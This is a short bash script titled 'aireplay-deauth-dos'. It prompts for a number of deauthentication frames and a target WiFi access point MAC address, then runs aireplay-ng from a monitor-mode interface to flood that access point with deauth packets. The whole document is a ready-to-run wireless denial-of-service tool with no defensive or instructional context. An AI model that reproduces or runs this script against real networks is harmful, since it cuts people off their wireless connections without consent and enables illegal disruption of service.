#! /bin/bash
# aireplay-deauth-dos

echo Starting AIREPLAY-NG in AP DOS mode...
echo Enter number of deauths
read -p 'Number of deauths to send: ' deauthvar
echo Enter target WiFi AP MAC
read -p 'WiFi AP: ' bssidvar
aireplay-ng -0 $deauthvar -a $bssidvar wlan0mon
echo Deauth finished!
